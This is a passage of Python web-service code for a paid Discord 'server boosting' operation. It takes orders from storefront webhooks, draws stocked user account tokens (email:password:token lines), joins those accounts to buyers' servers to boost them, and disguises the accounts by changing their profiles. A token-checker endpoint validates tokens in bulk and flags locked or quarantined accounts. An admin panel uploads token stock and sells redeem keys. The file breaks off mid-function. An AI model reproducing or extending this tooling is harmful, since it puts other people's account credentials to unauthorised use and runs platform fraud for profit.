        requiredStock = int(amount / 2)
        tokensStock = getStock(filename)
        if requiredStock > len(tokensStock):
            content = ""
            embed = DiscordEmbed(title="**Auto-Boosting Data**", description=f" **Stock Out ->**\n ``` Invoice Id : {invoiceid} \n Amount : {amount} \n Months: {months} \n Guild ID: {guild_id} \n Autobuy-Platform : Sellpass```", color=0x2F3136)
            send_webhook_message(webhook_url, content, embed)
        else:
            boost = Booster()
            tokens = []
            for x in range(requiredStock):
                tokens.append(tokensStock[x])
                remove(tokensStock[x], filename)
            start = time.time()
            status = boost.thread(guild_id, tokens)
            v1 = True
            i = 0
            retry = config['auto_config']['max_retry_on_failure']
            loop_try = True
            while len(status['success']) < amount and i < retry and loop_try != False:
                requiredStock1 = int((amount-len(status['success']))/2)
                n_tokens = []
                tokensStock1 = getStock(filename)
                for x in range(requiredStock1):  
                    try:
                        n_tokens.append(tokensStock1[x]) 
                        remove(tokensStock1[x], filename)
                        status = boost.thread(guild_id, n_tokens)
                        
                        try:
                            if config['auto_config']['Use_customization']:
                                boost.humanizerthread(tokens=status['success'])
                        except Exception as e:
                            print(e)
                        i = i+1
                    except IndexError:
                        loop_try = False
                        logging.error("Stock Out While Retrying Autobuy Order!")
                        break


            time_taken = round(time.time() - start, 2)
            loop_try = True
            if len(status['failed']) > 0 or len(status['captcha']):
                content = ""
                if webhook_url != "" and use_log == True:
                    embed = DiscordEmbed(title="**Auto-Boosting Data**", description=f" **Failure Detected ->**\n ``` Invoice Id : {invoiceid} \n Amount : {amount} \n Months: {months} \n Customer-Email : {email} \n Guild ID : {guild_id}``` \n ``` Failed-Boosts : {len(status['failed']) * 2} \n  Captcha-Boosts : {len(status['captcha']) * 2} \n  ``` **Failed Boosts** ```{status['failed']}```  \n**Captcha** ```{status['captcha']}``` \n **Note**``` This is not the final outcome! If you have retries enabled then the bot will futher retry with the remaining stock!```", color=0x2F3136)
                    send_webhook_message(webhook_url, content, embed)

            content = ""
            if webhook_url != "" and use_log == True:
                embed = DiscordEmbed(title="**Boosting Data**", description=f"**__Amount__ ->**  {amount} boosts \n**__Months__ ->** {months}m \n**__Guild ID__ ->** {guild_id} \n**__Tokens__ ->** {requiredStock} \n**__Success__ ->** {len(status['success'])*2} \n**__Failed__ ->** {len(status['failed'])}\n**__Time taken__ ->** {time_taken}s \n ** Failed/Invalid ** \n ``` {status['failed']}``` ** Captcha ** \n ``` {status['captcha']}``` \n **Success** \n ``` {status['success']}``` \n **Other Information** \n ``` \n Customer Invoice - {invoiceid} \n AutoBuy - Sellpass \n Customer-Email : {email} \n Guild ID : {guild_id} \n Retry : {i}/{retry}```", color=0x2F3136)
                send_webhook_message(webhook_url, content, embed)

            try:
                if config['auto_config']['Use_customization']:
                                boost.humanizerthread(tokens=status['success'])
            except Exception as e:
                print(e)
            if len(status['success']) == amount:
                success_note_sellpass = config['sellpass']['boosts_success_note']
                return f"{success_note_sellpass}"
            else:
                fail_note_sellpass = config['sellpass']['boosts_fail_note']
                return f"{fail_note_sellpass}"

    else: 
        logging.error("Invalid sellpass api key passed! [ Make sure to check the guide to get a valid api key! ]")
        content = ""
        if webhook_url != "" and use_log == True:
            embed = DiscordEmbed(title="**Invalid Sellpass Api Key Passed**", description=f" Invalid sellpass api key passed! [ Make sure to check the guide to get a valid api key! ]", color=0x2F3136)
            send_webhook_message(webhook_url, content, embed)  
        return f'Invalid api key passed!'

orders_sellapp = []
orders_sellix = []


@app.post("/sellix")
async def sellix(data: dict):
    if data in orders_sellix:
        pass
    elif data not in orders_sellix:
        threading.Thread(
            target=sellixshit,
            args=[
                data,
            ],
        ).start()
        orders_sellix.append(data)
    return {"message": f"We've recieved your order"}


def sellixshit(data):
    """"""
    invite = ""
    title = data["data"]["product_title"].lower()

    split_parts = title.split(" | ")

    amount = int(split_parts[0].split()[0])
    months = int(split_parts[1].split()[0])

    if amount == None or months == None:
        return

    for i in data["data"]["custom_fields"]:
        if i == config["sellix"]["invite_field_name"]:
            invite = data["data"]["custom_fields"][i]

    order_id = data["data"]["uniqid"]
    email = data["data"]["customer_email"]
    product = data["data"]["product_title"]

    guild_id = invite.strip() if invite.strip() else ""

    embeds_data = {
        "embeds": [
            {
                "title": "**Sellix Order**",
                "description": f"**Order ID: **{order_id}\n**Email: **{email}\n**Product: **{product}\n**Amount: **{amount} Boosts\n**Months: **{months} Months\n**Guild ID: **{guild_id}",
            }
        ]
    }

    response = httpx.post(
        config["sellix"]["orders"],
        data=json.dumps(embeds_data),
        headers={"Content-Type": "application/json"},
    )

    if response.status_code == 204:
        """"""
    else:
        print(response.json())

    if not guild_id or not check_guild_accessible(guild_id):
        return print(f"[ERROR]: Bot not in guild {guild_id} for order: {order_id}")

    if months == 1:
        filename = "data/1m.txt"
    if months == 3:
        filename = "data/3m.txt"

    tokensStock = getStock(filename)
    requiredStock = int(amount / 2)

    if requiredStock > len(tokensStock):
        return print(
            f"[ERROR]: We didn't had enough boosts to satisfy order: {order_id}"
        )

    tokens = []

    for x in range(requiredStock):
        tokens.append(tokensStock[x])
        remove(tokensStock[x], filename)

    cool = Booster()
    status = cool.thread(guild_id, tokens)
    success = status["success"]
    failed = status["failed"]

    print(
        f"{Fore.GREEN}[+]: Attempted to do {Fore.BLUE}{amount}x{Fore.RESET} {Fore.GREEN}boosts for {order_id} order id. {Fore.RESET} {Fore.CYAN}\n[-]: Successfully did {Fore.RESET}{len(success)}x boost. {Fore.CYAN}\n[-]: Failed to do {Fore.RESET}{len(failed)}x boosts.\n\n    Results \n[Success]: {success}\n[Failed]: {failed} \n\n"
    )

    completed_data = {
        "embeds": [
            {
                "title": "**Sellix Completion**",
                "description": f"**Order ID: **{order_id}\n**Email: **{email}\n**Product: **{product}\n**Amount: **{amount} Boosts\n**Months: **{months} Months\n**Guild ID: **{guild_id} \n\n**[SUCCESS]**: {success} \n**[FAILED]**: {failed}",
            }
        ]
    }

    response = httpx.post(
        config["sellapp"]["orders"],
        data=json.dumps(completed_data),
        headers={"Content-Type": "application/json"},
    )

    if response.status_code == 204:
        """"""
    else:
        print(response.json())



@app.post('/sellapp')
async def get_sellpass(data: dict):
    invoiceid = data['invoice']['id']
    r = data
    v1 = config['sellapp']['enabled']
    if v1 == True:

        r1 = r
        custom_fields = r1['additional_information']
        try: 
            invite_field_name = config['sellapp']['invite_field_name']
        except:
            logging.error("Make sure to recheck your invite field name [ Autobuy - Sellapp ]")
 
        nick_field_name = config['sellapp']['customisation']['nickname_field_name']
        bio_field_name = config['sellapp']['customisation']['bio_field_name']



        try: 
            for item in custom_fields:
                if item['label'] == invite_field_name:
                    invite = item['value']
        except:
            logging.error('Invalid invite field name passed make sure to recheck! [ Sellix Autoboosting ]')
            


        title = r1['listing']['title']
        email = r1['invoice']['payment']['gateway']['data']['customer_email']
        match = re.search(r'\d+', title)

        if match:
            amount = int(match.group())
            start_index = title.find('[') + 1
            end_index = title.find(']', start_index)
            months_str = title[start_index:end_index]
            months = int(''.join(filter(str.isdigit, months_str)))

        guild_id = invite.strip() if invite.strip() else ""
        if not guild_id or not check_guild_accessible(guild_id):
            content = ""
            embed = DiscordEmbed(title="**Auto-Boosting Data**", description=f" **Bot not in guild / Invalid Guild ID ->**\n ``` Invoice Id : {invoiceid} \n Amount : {amount} \n Months: {months} \n Guild ID: {guild_id}```", color=0x2F3136)
            send_webhook_message(webhook_url, content, embed)
            return

        if months == 1:
            filename = "data/1m.txt"
        if months == 3:
            filename = "data/3m.txt"

        requiredStock = int(amount / 2)
        tokensStock = getStock(filename)
        if requiredStock > len(tokensStock):
            content = ""
            embed = DiscordEmbed(title="**Auto-Boosting Data**", description=f" **Stock Out ->**\n ``` Invoice Id : {invoiceid} \n Amount : {amount} \n Months: {months} \n Guild ID: {guild_id} \n Autobuy-Platform : Sellapp```", color=0x2F3136)
            send_webhook_message(webhook_url, content, embed)
        else:
            boost = Booster()
            tokens = []
            for x in range(requiredStock):
                tokens.append(tokensStock[x])
                remove(tokensStock[x], filename)
            start = time.time()
            status = boost.thread(guild_id, tokens)
            v1 = True
            i = 0
            retry = config['auto_config']['max_retry_on_failure']
            loop_try = True
            while len(status['success']) < amount and i < retry and loop_try != False:
                requiredStock1 = int((amount-len(status['success']))/2)
                n_tokens = []
                tokensStock1 = getStock(filename)
                for x in range(requiredStock1):  
                    try:
                        n_tokens.append(tokensStock1[x]) 
                        remove(tokensStock1[x], filename)
                        status = boost.thread(guild_id, n_tokens)
                        try:
                            if config['auto_config']['Use_customization']:
                                boost.humanizerthread(tokens=status['success'])
                        except Exception as e:
                            print(e)
                        i = i+1
                    except IndexError:
                        loop_try = False
                        logging.error("Stock Out While Retrying Autobuy Order!")
                        break


            time_taken = round(time.time() - start, 2)
            loop_try = True
            if len(status['failed']) > 0 or len(status['captcha']) :
                content = ""
                if webhook_url != "" and use_log == True:
                    embed = DiscordEmbed(title="**Auto-Boosting Data**", description=f" **Failure Detected ->**\n ``` Invoice Id : {invoiceid} \n Amount : {amount} \n Months: {months} \n Customer-Email : {email} \n Guild ID : {guild_id}``` \n ``` Failed-Boosts : {len(status['failed']) * 2} \n  Captcha-Boosts : {len(status['captcha']) * 2} \n ``` **Failed Boosts** ```{status['failed']}```  \n**Captcha** ```{status['captcha']}``` \n **Success** \n ``` {status['success']}``` \n **Note**``` This is not the final outcome! If you have retries enabled then the bot will futher retry with the remaining stock!```", color=0x2F3136)
                    send_webhook_message(webhook_url, content, embed)

            content = ""
            if webhook_url != "" and use_log == True:
                embed = DiscordEmbed(title="**Boosting Data**", description=f"**__Amount__ ->**  {amount} boosts \n**__Months__ ->** {months}m \n**__Guild ID__ ->** {guild_id} \n**__Tokens__ ->** {requiredStock} \n**__Success__ ->** {len(status['success'])*2} \n**__Failed__ ->** {len(status['failed'])}\n**__Time taken__ ->** {time_taken}s \n ** Failed/Invalid ** \n ``` {status['failed']}``` ** Captcha ** \n ``` {status['captcha']}``` \n **Success** \n ``` {status['success']}``` \n **Other Information** \n ``` \n Customer Invoice - {invoiceid} \n AutoBuy - Sellapp \n Customer-Email : {email} \n Guild ID : {guild_id} \n Retry : {i}/{retry}```", color=0x2F3136)
                send_webhook_message(webhook_url, content, embed)
    
            try:
                if config['auto_config']['Use_customization']:
                                boost.humanizerthread(tokens=status['success'])
            except Exception as e:
                print(e)

    else: 
        logging.error("If you wanna use sellapp service then make sure to enable it from config file!")
        content = ""
        if webhook_url != "" and use_log == True:
            embed = DiscordEmbed(title="**Sellapp Setup Error**", description=f"If you wanna use sellapp service then make sure to enable it from config file!", color=0x2F3136)
            send_webhook_message(webhook_url, content, embed) 

# ── Web Panel Routes ──────────────────────────────────────────────────────────

@app.get("/", response_class=HTMLResponse)
async def web_panel():
    with open("templates/panel.html", "r", encoding="utf-8") as f:
        return f.read()

@app.get("/check", response_class=HTMLResponse)
async def token_checker_page():
    with open("templates/check.html", "r", encoding="utf-8") as f:
        return f.read()

@app.post("/api/check-auth")
async def api_check_auth(data: dict):
    password = data.get("password", "")
    checker_pw = config.get("checker_password") or config.get("panel_password") or ""
    if not checker_pw:
        return JSONResponse({"ok": False}, status_code=401)
    if password == checker_pw:
        return JSONResponse({"ok": True})
    return JSONResponse({"ok": False}, status_code=401)

@app.post("/api/check-tokens")
async def api_check_tokens(request: Request):
    # Auth check via header
    auth = request.headers.get("X-Checker-Auth", "")
    checker_pw = config.get("checker_password") or config.get("panel_password") or ""
    if not checker_pw or auth != checker_pw:
        return JSONResponse({"error": "Unauthorized"}, status_code=401)

    from concurrent.futures import ThreadPoolExecutor
    try:
        data = await request.json()
    except Exception:
        data = {}

    raw_lines = data.get("tokens", [])
    if not isinstance(raw_lines, list):
        return JSONResponse({"error": "tokens must be a list"}, status_code=400)

    lines = [l.strip() for l in raw_lines if l.strip()]
    if not lines:
        return JSONResponse([], status_code=200)

    useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    # Discord API error code → human reason
    DISCORD_CODES = {
        0:     "Invalid token",
        10001: "Unknown account",
        40002: "Account needs verification",
        40007: "Account locked / login attempts exceeded",
        40014: "Account disabled by Discord",
        40016: "Account temporarily disabled",
        50013: "Missing permissions",
    }

    def _classify_401(body_text):
        try:
            body = __import__("json").loads(body_text)
            code = body.get("code", 0)
            msg  = body.get("message", "")
            if code in DISCORD_CODES:
                return DISCORD_CODES[code]
            if "disabled" in msg.lower():
                return "Account disabled"
            if "locked" in msg.lower():
                return "Account locked"
            if "verify" in msg.lower():
                return "Needs verification"
        except Exception:
            pass
        return "Invalid token"

    def check_one(line):
        parts = line.split(":")
        if len(parts) >= 3:
            token = parts[2].strip()
        else:
            token = line.strip()

        result = {
            "original_line": line,
            "token_preview": token[:16] + "..." + token[-6:] if len(token) > 22 else token,
            "valid": False,
            "username": None,
            "email": parts[0] if len(parts) >= 3 else None,
            "nitro": False,
            "boost_slots": 0,
            "verified": False,
            "phone": False,
            "error": None,
            "error_type": None,
            "boosted_servers": [],
            "nitro_expires": None,
        }

        hdrs = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": useragent,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
        }

        try:
            me = requests.get(
                "https://discord.com/api/v9/users/@me",
                headers=hdrs,
                timeout=12,
            )
            if me.status_code == 401:
                reason = _classify_401(me.text)
                result["error"] = reason
                result["error_type"] = "locked" if "lock" in reason.lower() or "disabled" in reason.lower() or "verif" in reason.lower() else "invalid"
                return result
            if me.status_code == 429:
                result["error"] = "Rate limited — try again later"
                result["error_type"] = "ratelimit"
                return result
            if me.status_code != 200:
                result["error"] = f"Unexpected HTTP {me.status_code}"
                result["error_type"] = "unknown"
                return result

            me_data = me.json()
            result["valid"] = True
            uname = me_data.get("username", "")
            disc  = me_data.get("discriminator", "0")
            result["username"] = f"{uname}#{disc}" if disc and disc != "0" else uname
            result["verified"] = me_data.get("verified", False)
            result["phone"]    = bool(me_data.get("phone"))
            flags = me_data.get("flags", 0) or 0
            result["email"] = result["email"] or me_data.get("email")

            # Check if account appears disabled / quarantined via flags
            if flags & (1 << 20):  # QUARANTINED
                result["error"] = "Account quarantined"
                result["error_type"] = "locked"
                result["valid"] = False
                return result

        except Exception as e:
            result["error"] = f"Request failed: {e}"
            result["error_type"] = "error"
            return result

        try:
            slots_r = requests.get(
                "https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots",
                headers=hdrs,
                timeout=12,
            )
            if slots_r.status_code == 200:
                slots_data = slots_r.json()
                available = [s for s in slots_data if not s.get("premium_guild_subscription")]
                used_slots = [s for s in slots_data if s.get("premium_guild_subscription")]
                result["boost_slots"] = len(available)
                result["nitro"] = len(slots_data) > 0

                boosted = []
                for slot in used_slots:
                    pgs = slot.get("premium_guild_subscription", {})
                    gid = pgs.get("guild_id")
                    cooldown = slot.get("cooldown_ends_at")
                    gname = None
                    if gid:
                        try:
                            gr = requests.get(f"https://discord.com/api/v9/guilds/{gid}", headers=hdrs, timeout=8)
                            if gr.status_code == 200:
                                gname = gr.json().get("name")
                        except Exception:
                            pass
                    boosted.append({"guild_id": gid, "guild_name": gname, "cooldown_ends_at": cooldown})
                result["boosted_servers"] = boosted
            elif slots_r.status_code == 401:
                result["error"] = "Token locked (boost endpoint denied)"
                result["error_type"] = "locked"
                result["valid"] = False
                return result
        except Exception:
            pass

        try:
            sub_r = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=hdrs, timeout=8)
            if sub_r.status_code == 200:
                subs = sub_r.json()
                if subs and isinstance(subs, list):
                    result["nitro_expires"] = subs[0].get("current_period_end")
        except Exception:
            pass

        return result

    loop = asyncio.get_event_loop()
    results = await loop.run_in_executor(
        None,
        lambda: list(ThreadPoolExecutor(max_workers=10).map(check_one, lines))
    )
    return JSONResponse(results)

@app.get("/favicon.ico", include_in_schema=False)
async def favicon():
    from fastapi.responses import Response
    return Response(status_code=204)

@app.get("/health")
async def health_check():
    return {"status": "ok", "bot": "running"}

@app.get("/api/stock")
async def api_stock():
    try:
        c1m = db.count_tokens_db("1m")
        c3m = db.count_tokens_db("3m")
        return {
            "1m": {"tokens": c1m, "boosts": c1m * 2},
            "3m": {"tokens": c3m, "boosts": c3m * 2}
        }
    except RuntimeError:
        # MONGODB_URI not set — return zero stock (will work once env var is configured)
        return {
            "1m": {"tokens": 0, "boosts": 0},
            "3m": {"tokens": 0, "boosts": 0}
        }
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)

@app.post("/api/key-info")
async def api_key_info(data: dict):
    key = data.get("key", "").strip()
    if not key:
        return JSONResponse({"found": False, "error": "No key provided"}, status_code=400)
    try:
        k = db.get_key(key)
        if k:
            return {"found": True, "key": k["key"], "month": k["month"], "amount": k["amount"]}
        return {"found": False, "error": "Key not found"}
    except Exception as e:
        return JSONResponse({"found": False, "error": str(e)}, status_code=500)

@app.post("/api/redeem")
async def api_redeem(data: dict):
    key = data.get("key", "").strip()
    guild_id = str(data.get("guild_id", "")).strip().replace("https://discord.com/channels/","").split("/")[0]
    custom_bio  = str(data.get("bio",  "") or "").strip() or None
    custom_nick = str(data.get("nick", "") or "").strip() or None

    if not key or not guild_id:
        return JSONResponse({"success": False, "error": "Key and guild_id are required"}, status_code=400)

    try:
        amount, months = fetch_from_key(key)
    except KeyError:
        return JSONResponse({"success": False, "error": "Invalid key or key not found"}, status_code=400)

    if amount % 2 != 0:
        return JSONResponse({"success": False, "error": "Boost amount in key must be an even number"}, status_code=400)

    if months not in [1, 3]:
        return JSONResponse({"success": False, "error": "Invalid month value in key (must be 1 or 3)"}, status_code=400)

    if not check_guild_accessible(guild_id):
        bot_invite = get_bot_invite_url()
        wh_log(
            "🔴 Bot Not In Server — Key Redemption Blocked",
            f"**Key:** `{key}`\n**Guild ID:** `{guild_id}`\n**Action Required:** Add the bot to the server before redeeming.\n**Bot Invite:** {bot_invite or 'N/A (bot_client_id not set)'}",
            color=0xef4444
        )
        return JSONResponse({
            "success": False,
            "error": "The bot is not in that server yet. Add the bot first, then redeem your key.",
            "needs_bot_added": True,
            "bot_invite_url": bot_invite,
            "guild_id": guild_id
        }, status_code=400)

    filename = "data/1m.txt" if months == 1 else "data/3m.txt"
    tokensStock = getStock(filename)
    requiredStock = int(amount / 2)

    if requiredStock > len(tokensStock):
        wh_log(
            "⚠️ Stock Out — Key Redemption Failed",
            f"**Key:** `{key}`\n**Guild ID:** `{guild_id}`\n**Required:** {requiredStock} tokens\n**Available:** {len(tokensStock)} tokens",
            color=0xeab308
        )
        return JSONResponse({
            "success": False,
            "error": f"Not enough stock. Need {requiredStock} tokens, only {len(tokensStock)} available."
        }, status_code=400)

    job_id = str(_uuid.uuid4())[:8]
    _boost_jobs[job_id] = {"status": "running"}

    wh_log(
        "🚀 Boost Job Started — Web Panel",
        f"**Key:** `{key}`\n**Guild ID:** `{guild_id}`\n**Amount:** {amount} boosts ({months}m)\n**Job ID:** `{job_id}`",
        color=0x7c3aed
    )

    def _run_boost():
        tokens = []
        for x in range(requiredStock):
            tokens.append(tokensStock[x])
            remove(tokensStock[x], filename)
        start = time.time()
        boost = Booster()
        status = boost.thread(guild_id, tokens)
        time_taken = round(time.time() - start, 2)
        new_len = len(status["failed"]) * 2 + len(status["captcha"]) * 2
        if len(status["failed"]) > 0 or len(status["captcha"]) > 0:
            update_key(key, new_len)
            wh_log(
                "⚠️ Boost Partial Failure — Web Panel",
                f"**Key:** `{key}`\n**Guild ID:** `{guild_id}`\n**Success:** {len(status['success'])*2} boosts\n**Failed:** {len(status['failed'])*2}\n**Captcha:** {len(status['captcha'])*2}\n**Time:** {time_taken}s\n**Remaining balance:** {new_len} boosts",
                color=0xeab308
            )
        else:
            mark_key_used(key, months, amount, guild_id, len(status["success"]), len(status["failed"]), time_taken)
            wh_log(
                "✅ Boost Complete — Web Panel",
                f"**Key:** `{key}`\n**Guild ID:** `{guild_id}`\n**Success:** {len(status['success'])*2} boosts\n**Failed:** {len(status['failed'])*2}\n**Time:** {time_taken}s",
                color=0x22c55e
            )
        try:
            if config['auto_config']['Use_customization']:
                boost.humanizerthread(tokens=status['success'], custom_bio=custom_bio, custom_nick=custom_nick)
        except Exception:
            pass
        _boost_jobs[job_id] = {
            "status": "done",
            "success": len(status["success"]) * 2,
            "failed": len(status["failed"]) * 2,
            "captcha": len(status["captcha"]) * 2,
            "time_taken": time_taken
        }

    threading.Thread(target=_run_boost, daemon=True).start()
    return {"success": True, "job_id": job_id, "message": "Boost started successfully"}

@app.get("/api/status/{job_id}")
async def api_status(job_id: str):
    job = _boost_jobs.get(job_id)
    if not job:
        return JSONResponse({"error": "Job not found"}, status_code=404)
    return job

# ── End Web Panel Routes ───────────────────────────────────────────────────────

# ── Admin Panel Routes ─────────────────────────────────────────────────────────
import secrets as _sec
from fastapi import Header as _Header

_admin_sessions: dict = {}  # token -> expiry timestamp

def _check_admin(authorization: str = None):
    if not authorization or not authorization.startswith("Bearer "):
        return False
    token = authorization[7:]
    exp = _admin_sessions.get(token)
    if not exp:
        return False
    if time.time() > exp:
        del _admin_sessions[token]
        return False
    return True

@app.get("/admin", response_class=HTMLResponse)
async def admin_page():
    with open("templates/admin.html", "r", encoding="utf-8") as f:
        return f.read()

@app.post("/admin/login")
async def admin_login(request: Request):
    try:
        body = await request.json()
        pw = body.get("password", "")
    except Exception:
        return JSONResponse({"error": "bad request"}, status_code=400)
    panel_pw = config.get("panel_password") or ""
    if not panel_pw:
        return JSONResponse({"error": "No panel password configured"}, status_code=401)
    if pw != panel_pw:
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    token = _sec.token_hex(32)
    _admin_sessions[token] = time.time() + 86400  # 24h session
    return JSONResponse({"token": token})

@app.get("/admin/verify")
async def admin_verify(authorization: str = _Header(None)):
    if not _check_admin(authorization):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    return JSONResponse({"ok": True})

@app.get("/admin/api/keys")
async def admin_list_keys(authorization: str = _Header(None)):
    if not _check_admin(authorization):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        return JSONResponse(db.load_keys())
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)

@app.delete("/admin/api/key/{key_id:path}")
async def admin_delete_key(key_id: str, authorization: str = _Header(None)):
    if not _check_admin(authorization):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        db.delete_key_entry(key_id)
        return JSONResponse({"ok": True})
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)

@app.delete("/admin/api/keys/all")
async def admin_delete_all_keys(authorization: str = _Header(None)):
    if not _check_admin(authorization):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        db.clear_all_keys()
        return JSONResponse({"ok": True})
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)

@app.get("/admin/api/used-keys")
async def admin_used_keys(authorization: str = _Header(None)):
    if not _check_admin(authorization):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        return JSONResponse(db.get_used_keys())
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)

@app.delete("/admin/api/used-keys/clear")
async def admin_clear_used_keys(authorization: str = _Header(None)):
    if not _check_admin(authorization):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        db.clear_used_keys()
        return JSONResponse({"ok": True})
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)

@app.post("/admin/api/generate-key")
async def admin_generate_key(request: Request, authorization: str = _Header(None)):
    if not _check_admin(authorization):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        body = await request.json()
        month = int(body.get("month", 1))
        amount = int(body.get("amount", 2))
        quantity = int(body.get("quantity", 1))
        if month not in (1, 3):
            return JSONResponse({"error": "month must be 1 or 3"}, status_code=400)
        if amount < 2 or amount % 2 != 0:
            return JSONResponse({"error": "amount must be a positive even number"}, status_code=400)
        if quantity < 1 or quantity > 100:
            return JSONResponse({"error": "quantity must be 1-100"}, status_code=400)
        generated = []
        for _ in range(quantity):
            new_key = f"BOOST-{''.join(_sec.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(5))}-{''.join(_sec.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(5))}-{''.join(_sec.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(5))}"
            entry = {"key": new_key, "month": month, "amount": amount}
            db.add_key_entry(entry)
            generated.append(entry)
        return JSONResponse({"keys": generated})
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)

@app.post("/admin/api/upload-tokens")
async def admin_upload_tokens(authorization: str = _Header(None), file: UploadFile = File(...), type: str = Form(...)):
    if not _check_admin(authorization):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    if type not in ("1m", "3m"):
        return JSONResponse({"error": "type must be 1m or 3m"}, status_code=400)
    try:
        content = await file.read()
        new_tokens = [t.strip() for t in content.decode("utf-8", errors="ignore").splitlines() if t.strip()]
        existing_count = db.count_tokens_db(type)
        added = db.add_tokens_db(type, new_tokens)
        total = existing_count + added
        if new_tokens:
            threading.Thread(target=authorize_tokens_batch, args=(new_tokens,), daemon=True).start()
        return JSONResponse({"ok": True, "added": added, "total": total})
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)

@app.delete("/admin/api/clear-stock/{stock_type}")
async def admin_clear_stock(stock_type: str, authorization: str = _Header(None)):
    if not _check_admin(authorization):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    if stock_type not in ("1m", "3m"):
        return JSONResponse({"error": "type must be 1m or 3m"}, status_code=400)
    try:
        db.clear_tokens_db(stock_type)
        return JSONResponse({"ok": True})
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)


@app.post("/admin/api/test-token")
async def admin_test_token(request: Request, authorization: str = _Header(None)):
    if not _check_admin(authorization):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    body = await request.json()
    raw_token = (body.get("token") or "").strip()
    guild_id_raw = str(body.get("guild_id") or "").strip()
    # Accept invite links, channel URLs, or plain IDs
    guild_id = re.sub(r"[^0-9]", "", guild_id_raw.replace("https://discord.com/channels/","").split("/")[0]) if guild_id_raw else ""
    if not raw_token:
        return JSONResponse({"error": "token is required"}, status_code=400)

    def _run_test():
        # Parse: support email:pass:token  OR  plain token
        parts = raw_token.split(":")
        if len(parts) >= 3:
            token = parts[2].strip()
        else:
            token = raw_token.strip()

        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        hdrs = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": ua,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
        }

        result = {
            "token_preview": token[:18] + "..." + token[-6:] if len(token) > 24 else token,
            "valid": False,
            "username": None,
            "user_id": None,
            "nitro": False,
            "boost_slots": 0,
            "boost_slots_used": 0,
            "verified": False,
            "phone": False,
            "oauth_token": False,
            "joined": None,   # None = not attempted
            "boosted": None,  # None = not attempted
            "steps": {},      # step-by-step detail
            "error": None,
        }

        # ── Step 1: Validate token ────────────────────────────────────────
        try:
            me = requests.get("https://discord.com/api/v9/users/@me", headers=hdrs, timeout=15)
            if me.status_code == 401:
                try:
                    body_j = me.json()
                    code = body_j.get("code", 0)
                    codes = {40002: "Needs verification", 40007: "Account locked", 40014: "Account disabled"}
                    reason = codes.get(code, "Invalid token")
                except Exception:
                    reason = "Invalid token (401)"
                result["steps"]["validate"] = {"ok": False, "msg": reason}
                result["error"] = reason
                return result
            if me.status_code == 429:
                result["steps"]["validate"] = {"ok": False, "msg": "Rate limited — try again in a moment"}
                result["error"] = "Rate limited"
                return result
            if me.status_code != 200:
                result["steps"]["validate"] = {"ok": False, "msg": f"HTTP {me.status_code}"}
                result["error"] = f"Discord returned HTTP {me.status_code}"
                return result

            me_data = me.json()
            result["valid"] = True
            uname = me_data.get("username", "")
            disc  = me_data.get("discriminator", "0")
            result["username"]  = f"{uname}#{disc}" if disc and disc != "0" else uname
            result["user_id"]   = me_data.get("id")
            result["verified"]  = me_data.get("verified", False)
            result["phone"]     = bool(me_data.get("phone"))
            result["steps"]["validate"] = {"ok": True, "msg": f"Logged in as {result['username']}"}
        except Exception as e:
            result["steps"]["validate"] = {"ok": False, "msg": str(e)}
            result["error"] = f"Validate failed: {e}"
            return result

        # ── Step 2: Nitro / boost slots ───────────────────────────────────
        try:
            slots_r = requests.get(
                "https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots",
                headers=hdrs, timeout=15
            )
            if slots_r.status_code == 200:
                slots_data = slots_r.json()
                available  = [s for s in slots_data if not s.get("premium_guild_subscription")]
                used       = [s for s in slots_data if s.get("premium_guild_subscription")]
                result["nitro"]            = len(slots_data) > 0
                result["boost_slots"]      = len(available)
                result["boost_slots_used"] = len(used)
                msg = f"Nitro with {len(available)} free slot(s), {len(used)} used" if result["nitro"] else "No Nitro"
                result["steps"]["nitro"] = {"ok": True, "msg": msg}
            else:
                result["nitro"] = False
                result["steps"]["nitro"] = {"ok": True, "msg": "No Nitro (no boost slots)"}
        except Exception as e:
            result["steps"]["nitro"] = {"ok": False, "msg": f"Check failed: {e}"}

        # ── Step 3: OAuth token ───────────────────────────────────────────
        user_id = result["user_id"]
        at = None
        try:
            at = get_stored_oauth_token(token)
            if at:
                result["oauth_token"] = True
                result["steps"]["oauth"] = {"ok": True, "msg": "OAuth token found in cache"}
            else:
                at, _ = get_oauth_token_from_user(token)
                if at:
                    if user_id:
                        store_oauth_token(token, user_id, at)
                    result["oauth_token"] = True
                    result["steps"]["oauth"] = {"ok": True, "msg": "OAuth token obtained fresh"}
                else:
